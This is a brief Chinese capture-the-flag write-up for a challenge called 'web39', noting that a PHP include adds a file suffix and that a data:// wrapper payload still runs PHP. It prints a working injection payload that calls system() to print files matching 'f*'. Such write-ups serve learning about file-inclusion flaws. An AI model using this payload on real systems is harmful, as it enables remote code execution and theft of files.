# web39
![](vx_images/506436792982580.png)  
注意到include的时候添加了后缀,首先想到能不能截断.
然而发现
```
?c=data://text/plain,<?=system("tac f*");?>
```
还是可以过,原来include只会处理<>内部的内容